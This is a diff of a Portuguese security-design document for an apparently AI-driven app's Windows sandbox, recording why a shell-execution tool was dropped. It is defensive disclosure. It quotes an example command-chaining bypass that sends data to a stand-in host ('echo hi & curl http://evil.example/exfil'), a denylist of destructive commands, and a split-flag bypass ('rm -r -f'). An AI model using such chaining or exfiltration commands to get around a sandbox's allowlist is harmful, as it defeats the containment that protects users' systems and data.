@@ -3,11 +3,11 @@
 > Frederico IA Studio — modelo de segurança do sandbox Windows
 > (Fase 7, Etapa 7 — fecha a Fase 7).
 >
-> **Última atualização:** 2026-08-14 (Etapa 7 fechada — `exec.shell`
-> com denylist/allowlist de comandos + allowlist de rede carregada
-> de perfil TOML, em vez de hardcoded vazia; DNS intercept via
-> `netsh` tentado e removido depois de verificação provar que não
-> protegia nada).
+> **Última atualização:** 2026-08-14 (Etapa 7 fechada — allowlist
+> de rede carregada de perfil TOML, em vez de hardcoded vazia;
+> DNS intercept via `netsh` tentado e removido depois de
+> verificação provar que não protegia nada; `exec.shell` tentado
+> e descartado — ver §4).
 
 ## Resumo
 
@@ -219,30 +219,44 @@ criar um service Windows que aplica os labels (roda como
 SYSTEM com SeSecurityPrivilege); o app user-mode chama o
 service via RPC. Complexo, Fases 8+.
 
-### 4. **`exec.shell` — denylist/allowlist são defesa em
-   profundidade, não a barreira primária**
+### 4. **`exec.shell` — tentado e descartado (2026-08-14)**
 
-`exec.shell` (Etapa 7) roda sob as mesmas 4 camadas acima, mais
-uma checagem de comando em `frederico_security::exec_patterns`
-**antes** do spawn: uma denylist de comandos destrutivos (`rm
--rf`, `format`, `diskpart`, etc.) e uma allowlist de binários
-read-only (`ls`, `cat`, `grep`, ...). As duas são aplicadas
-**incondicionalmente** — não existe hoje um caminho pra ler
-`PermissionSet.terminal` dentro do `Tool::execute` (o
-`ToolContext` não carrega `PermissionSet`), então não há um modo
-"sem allowlist" para usuário avançado ainda.
+A Etapa 7 tentou entregar um `exec.shell` (executar comandos de
+terminal sob o sandbox) e descartou a feature no mesmo dia,
+depois de duas rodadas de falha real:
 
-**Limitação honesta:** o match é substring case-insensitive
-contra o command string inteiro, não um parser de shell. `rm -r
--f` (flags separadas) **não** casa `rm -rf` — bypass conhecido,
-fixado em teste
-(`crates/security/src/exec_patterns.rs::shell_denylist_hit_documents_split_flag_bypass`),
-não escondido. Um comando que passa pela denylist/allowlist
-ainda roda sob as 4 camadas de processo — path safety continua
-bloqueando write-up, e a rede continua deny-by-default pelo
-proxy. A denylist/allowlist reduz a superfície óbvia (o modelo
-tentando `rm -rf` diretamente); não é uma prova formal de que
-nenhum comando destrutivo passa.
+1. **v1 (comando como string única pro `cmd.exe /c "<command>"`):**
+   bypass completo da allowlist. `cmd.exe /c "..."` **é** um
+   shell — operadores (`&`, `&&`, `|`, `||`) dentro da string
+   eram interpretados por ele. `echo hi & curl
+   http://evil.example/exfil` passava a allowlist do primeiro
+   token (`echo`) e nenhuma substring da denylist batia, e o
+   `cmd.exe` rodava os dois comandos.
+2. **Tentativa de correção (`program`+`args` separados, sem
+   shell, `CreateProcessAsUserW` direto):** fechava o bypass acima
+   por construção (operadores de shell viram caracteres literais
+   de argv), mas esbarrou num problema estrutural — os binários
+   read-only da allowlist (`ls`, `cat`, `head`, `tail`, `grep`,
+   `wc`, `pwd`, `echo`, resolvidos via Git for Windows) são
+   compilados contra o runtime **MSYS2**, que precisa criar um
+   objeto de kernel no namespace global (`\BaseNamedObjects`) pra
+   inicializar sua camada de emulação POSIX. Sob **Low
+   Integrity** (o nível do processo filho do sandbox), isso falha
+   com `STATUS_ACCESS_DENIED` — **o sandbox bloqueando é o
+   comportamento correto**, mesmo mecanismo de Mandatory Label
+   que já bloqueia escrita fora do jail (§1 acima), não um bug a
+   "consertar" afrouxando a integridade do child.
+
+Binários **nativos** (não-MSYS2) confirmados rodando sob o
+sandbox existem (`findstr.exe`, `where.exe`), mas a capacidade
+remanescente é redundante com `exec.python`/`exec.node`, que já
+cobrem list/read/grep/count de dentro do jail, com resultado
+estruturado. Somado ao fato de que qualquer binário capaz de
+lançar outro processo (ex.: `find -exec`) reabre a Etapa 7
+inteira por dentro, a conclusão foi descartar — não adiar.
+`exec.shell` não está no catálogo. Detalhe completo:
+`docs/decisions/0034-fase-7-write-exec-approval-policy.md`
+§"Histórico de revisão".
 
 ## Como reportar vulnerabilidades
 
